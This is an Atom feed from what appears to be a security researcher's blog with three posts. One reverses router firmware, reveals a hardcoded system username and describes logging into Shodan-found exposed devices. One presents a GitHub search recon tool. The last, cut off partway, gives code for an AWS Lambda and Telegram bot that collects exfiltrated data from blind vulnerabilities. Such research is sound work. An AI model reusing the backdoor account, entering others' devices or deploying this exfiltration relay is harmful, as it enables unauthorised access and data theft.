<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-US"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="https://xpl0ited1.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://xpl0ited1.io/" rel="alternate" type="text/html" hreflang="en-US" /><updated>2022-06-23T11:56:15-04:00</updated><id>https://xpl0ited1.io/feed.xml</id><title type="html">xpl0ited1</title><subtitle>Bug Bounty Hunter, CyberSecurity Researcher &lt;a href=&quot;https://www.cntr0llz.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;@cntr0llz&lt;/a&gt;.</subtitle><author><name>xpl0ited1</name><email>xpl0ited1@pm.me</email></author><entry><title type="html">Reversing IOT: Part 1</title><link href="https://xpl0ited1.io/reversing-iot-part-1/" rel="alternate" type="text/html" title="Reversing IOT: Part 1" /><published>2021-09-22T16:47:00-03:00</published><updated>2021-09-22T16:47:00-03:00</updated><id>https://xpl0ited1.io/reversing-iot-part-1</id><content type="html" xml:base="https://xpl0ited1.io/reversing-iot-part-1/">&lt;hr /&gt;

&lt;p&gt;Hello, it‚Äôs been a while since my last post, but I‚Äôm here now to show you some basic reverse engineering
tips for some IOT devices, I mean with this post I‚Äôm starting a series of reverse engineering on IOT devices üë®‚Äçüíª.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Well I cant disclose now the device tested and the vendor, so let‚Äôs say we are testing some Industrial LTE 4G router.&lt;/p&gt;

&lt;p&gt;First I‚Äôve downloaded the firmware from the vendor web page, and extracted the filesystem using binwalk:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xpl0ited1@freedom?&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;binwalk &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; firmware.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then I started to look for some common .cgi endpoints like web.cgi, this to check if there is some way to bypass the authentication schema. I noticed that every time the device checks if the user is logged in, it does it by using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ICOS_CheckPrivilege&lt;/code&gt; function:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_27.png&quot; alt=&quot;img_27.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Also I saw that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ICOS_CheckPrivilege&lt;/code&gt; function also is used to check the user privileges, I mean if the user is admin, guest, etc. 
That kind of check is made by passing the result of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ICOS_CheckPrivilege&lt;/code&gt; function to the address stored at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_1c&lt;/code&gt;, and then checking that address with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;level2str&lt;/code&gt; function:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img.png&quot; alt=&quot;img.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;level2str&lt;/code&gt; function there is some kind of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;switch/case&lt;/code&gt; sentence that checks if the value stored at the address on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_1c&lt;/code&gt; is 1,2,3,4 or 5. By this way the function returns the user level:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_1.png&quot; alt=&quot;img_1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With all that in mind my question was ‚Äúhow does the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ICOS_CheckPrivilege&lt;/code&gt; function calculates sets the user level and why?‚Äù. Here is how the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ICOS_CheckPrivilege&lt;/code&gt; function looks like:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_4.png&quot; alt=&quot;img_4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When looking at the code of the function, I saw that the crypt function is used:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_5.png&quot; alt=&quot;img_5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This function ‚Äúis the password encryption function.  It is based on the Data Encryption Standard algorithm with variations intended (among other things) to discourage use of hardware implementations of a key search.‚Äù, and there is a paramater that is used for salting the key:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_7.png&quot; alt=&quot;img_7.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So for now I have that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data_4bef464c&lt;/code&gt; data reference is the salt for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arg2&lt;/code&gt; or the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password input&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_28.png&quot; alt=&quot;img_28.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When checking at the address of the data reference I‚Äôve got that the salt is just &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$1$&lt;/code&gt; ü§¶:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_6.png&quot; alt=&quot;img_6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With all that in mind I made a few changes to the code of the function, modifying some variable names:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_8.png&quot; alt=&quot;img_8.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By other hand, there is a string comparison before comparing the password. At this comparison some value at R4 register is compared with the arg1, so I could guess that is the username, right?:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_9.png&quot; alt=&quot;img_9.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;While examining the whole comparison code block, I noticed that is inside a do/while loop that increments by 1 the value of the R5 register every time until is 4, this remind the switch/case sentence, btw if the register is 4 it skips to the next  line that check if the username is the same at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data_4bef4650&lt;/code&gt; data reference, which is iwu@fbt&amp;amp;ND:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_10.png&quot; alt=&quot;img_10.png&quot; /&gt;
&lt;img src=&quot;img_12.png&quot; alt=&quot;img_12.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is how the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;level2str&lt;/code&gt; function looks like in Ghidra, as you can see if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;param1&lt;/code&gt; (var_1c) is 4 it does nothing, and if it is 5 the user level returned is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_11.png&quot; alt=&quot;img_11.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So basically if the username is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iwu@fbt&amp;amp;ND&lt;/code&gt; we are system:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_13.png&quot; alt=&quot;img_13.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But now what is the password for that user?, the password is stored at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_84&lt;/code&gt; pointer:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_14.png&quot; alt=&quot;img_14.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I renamed the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_84&lt;/code&gt; variable to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system_pass_addr&lt;/code&gt;, and if we look at the beggining of the function we could see the address were the password is stored in the stack:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_15.png&quot; alt=&quot;img_15.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So when looking at the stack we now have the address where the data reference of the system password is:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_16.png&quot; alt=&quot;img_16.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_17.png&quot; alt=&quot;img_17.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After cracking the password with hashcat I got the system user password:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_18.png&quot; alt=&quot;img_18.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, looking in Shodan for some exposed devices I could saw that there a few:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_19.png&quot; alt=&quot;img_19.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When browsing in some of the exposed devices I got this initial web page that shows me as guest:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_20.png&quot; alt=&quot;img_20.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then I‚Äôve logged in and had access to restricted functionalities:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_22.png&quot; alt=&quot;img_22.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_23.png&quot; alt=&quot;img_23.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_24.png&quot; alt=&quot;img_24.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_25.png&quot; alt=&quot;img_25.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And of course there is and RCE üè¥‚Äç‚ò†Ô∏è that I‚Äôve already reported to mitre, and the best of all is fully unauthenticated, I‚Äôve just found it by exploring as authenticated user the device portal, but it is also leaked in some JS files:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_26.png&quot; alt=&quot;img_26.png&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;And that‚Äôs all folks, thanks for reading, and I will post a second part of the full RCE when the vendor release a patch. Cheers!!! ü¶ú&lt;/p&gt;

&lt;p&gt;üè¥‚Äç‚ò†Ô∏è üè¥‚Äç‚ò†Ô∏è üè¥‚Äç‚ò†Ô∏è üè¥‚Äç‚ò†Ô∏è üè¥‚Äç‚ò†Ô∏è&lt;/p&gt;</content><author><name>xpl0ited1</name><email>xpl0ited1@pm.me</email></author><category term="update," /><category term="tools," /><category term="recon" /><summary type="html"></summary></entry><entry><title type="html">Tools: githubGrep</title><link href="https://xpl0ited1.io/gitgrep/" rel="alternate" type="text/html" title="Tools: githubGrep" /><published>2021-07-15T16:51:00-04:00</published><updated>2021-07-15T16:51:00-04:00</updated><id>https://xpl0ited1.io/gitgrep</id><content type="html" xml:base="https://xpl0ited1.io/gitgrep/">&lt;p&gt;&lt;img src=&quot;https://img.shields.io/maintenance/yes/2021?style=plastic&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://img.shields.io/github/languages/top/xpl0ited1/githubGrep?style=plastic&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://img.shields.io/github/issues/xpl0ited1/githubGrep?style=plastic&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://img.shields.io/github/license/xpl0ited1/githubGrep?style=plastic&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://img.shields.io/github/v/tag/xpl0ited1/githubGrep?label=version&amp;amp;style=plastic&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;p&gt;Hi, today I‚Äôm going to show you a simple tool I‚Äôve developed that allows you to ‚Äúgrep‚Äù for a string in a repository or organization on Github. This tool could be used in the recon phase of a pentest or bug hunt.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/xpl0ited1/githubGrep&quot;&gt;Github Repository&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;

&lt;p&gt;This tool will allow you to search for any code on a specific repository or organization and even a user&lt;/p&gt;

&lt;h3 id=&quot;install&quot;&gt;Install&lt;/h3&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;go get github.com/xpl0ited1/githubGrep
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;usage&quot;&gt;Usage&lt;/h3&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ githubGrep -search GITHUB -user xpl0ited1 -lang Go

  -content
        display content of code
  -lang string
        programming language
  -org string
        organization to look at
  -page int
        page number, only if results are more than 100 (default 1)
  -repo string
        repo to look at
  -search string
        code to search
  -user string
        user to look at


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;examples&quot;&gt;Examples&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;img.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_1.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_2.png&quot; alt=&quot;img_2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;img_3.png&quot; alt=&quot;img_3.png&quot; /&gt;&lt;/p&gt;</content><author><name>xpl0ited1</name><email>xpl0ited1@pm.me</email></author><category term="update," /><category term="tools," /><category term="recon" /><summary type="html"></summary></entry><entry><title type="html">Creating a Serverless Exfiltrating Bot with AWS Lambda and Telegram</title><link href="https://xpl0ited1.io/awslambda-telegrambot/" rel="alternate" type="text/html" title="Creating a Serverless Exfiltrating Bot with AWS Lambda and Telegram" /><published>2021-07-15T00:04:20-04:00</published><updated>2021-07-15T00:04:20-04:00</updated><id>https://xpl0ited1.io/awslambda-telegrambot</id><content type="html" xml:base="https://xpl0ited1.io/awslambda-telegrambot/">&lt;p&gt;Helloooooooooo ü§óü§óü§ó, in this post I will show you how to create a serverless exfil bot with Telegram and AWS Lambda + API Gateway.&lt;/p&gt;

&lt;p&gt;This can help you with the exfiltration of data in OOB and Blind vulnerabilities, also for fingerprinting the victims browser, etc.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;creating-the-serverless-function&quot;&gt;Creating the serverless function&lt;/h1&gt;

&lt;p&gt;First we have to get an AWS account obviously, then we select &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Lambda&lt;/code&gt; in the services tab, after that we will get to a panel with a list of previously created lambda functions,
we just create a new function by clicking at the orange &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Create a function&lt;/code&gt; button:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-06.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We select &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Create from zero&lt;/code&gt;, specify the name of the function and select the programming language we are going to use, in this case we select &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Python 3.8&lt;/code&gt;.
Then we just click on the orange &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Create a function&lt;/code&gt; button:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-08.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After creating the function we get a panel as shown  in the image with a template function that returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hello from Lambda!&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-09.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For this use case we must load some external libraries on to the serverless function, this because AWS Lambda env by default doesn‚Äôt loads the generic Python SDK, in other words, in this case we need to use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;requests&lt;/code&gt; Python library and the base env for a lambda function doesn‚Äôt have it.
For importing these ‚Äúgeneric‚Äù Python libraries we must click were it puts &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Layers&lt;/code&gt;, under the name of the function.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-09_1.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then we click at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Add layer&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-09_2.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we are presented to a panel to select with layer we are going to import or add.
We select the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Specify ARN&lt;/code&gt;, and add the following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ARN&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;arn:aws:lambda:us-east-1:668099181075:layer:AWSLambda-Python-AWS-SDK:4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then we click &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Add&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-10.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With all that we are just created the base for our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Lambda&lt;/code&gt; function.&lt;/p&gt;
&lt;hr /&gt;

&lt;h1 id=&quot;creating-the-api&quot;&gt;Creating the API&lt;/h1&gt;

&lt;p&gt;Now in the services tab we select &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;API Gateway&lt;/code&gt;, were the following panel will load. Here we must click at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Add API&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-14.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We select the type of API we are going to use, in this case an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;API HTTP&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-15.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we must select the serverless function we are going to integrate with the API, and specify the name of the API.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-16.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Config routes&lt;/code&gt; panel we should specify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANY&lt;/code&gt; method, so we can trigger the serverless function
with any HTTP method. Also we must specify a base path:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-17.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this step we let it as default:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-17_1.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we just click at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Create&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-17_2.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After the creation of the API we will get a URL of the API that will trigger our serverless function:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-19.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There is a menu at the left of the screen, there we select the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Routes&lt;/code&gt; option:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-19_1.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we will place a default route that will trigger our serverless function if any of the other routes doesn‚Äôt match in the HTTP request,
we must put the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$default&lt;/code&gt; value and the click &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Create&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-20.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We must specify an integration for the default route, here we select again our Lambda function:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-20_1.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-20_2.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After the integration between the route and the serverless function, we must click at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Deploy&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-20_3.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now for testing purposes we check with the URL provided before in our browser to see if the integration was successful&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-21.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-21_1.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-22.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h1 id=&quot;updating-the-serverless-function-code&quot;&gt;Updating the serverless function code&lt;/h1&gt;

&lt;p&gt;Now we must modify the code of the serverless function, with the following code:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;json&lt;/span&gt;
    &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;botocore.vendored&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;telegram_bot_sendtext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bot_message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        
        &lt;span class=&quot;n&quot;&gt;bot_token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;bot_chatID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;send_text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'https://api.telegram.org/bot'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bot_token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/sendMessage?chat_id='&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bot_chatID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&amp;amp;parse_mode=Markdown&amp;amp;text='&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bot_message&lt;/span&gt;
    
        &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send_text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
    
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;lambda_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;headers&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;items&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;:&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
        
        &lt;span class=&quot;n&quot;&gt;telegram_bot_sendtext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# TODO implement
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;'statusCode'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Dont forget to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Deploy&lt;/code&gt;!!!
¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†üëáüëá&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-22_1.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;creating-the-telegram-bot&quot;&gt;Creating the telegram bot&lt;/h1&gt;

&lt;p&gt;We have to send  a message to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@BotFather&lt;/code&gt;, with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/newbot&lt;/code&gt; command, then specify the name of the bot,
and we will get a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bot Token&lt;/code&gt;, as shown in the following image:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-26.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We send a message to our new bot, any message, or just &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/start&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;2021-07-15_22-28.png&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we need a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Chat ID&lt;/code&gt; for our serverless function work. So we must go to the following URL specifying the Bot Token,
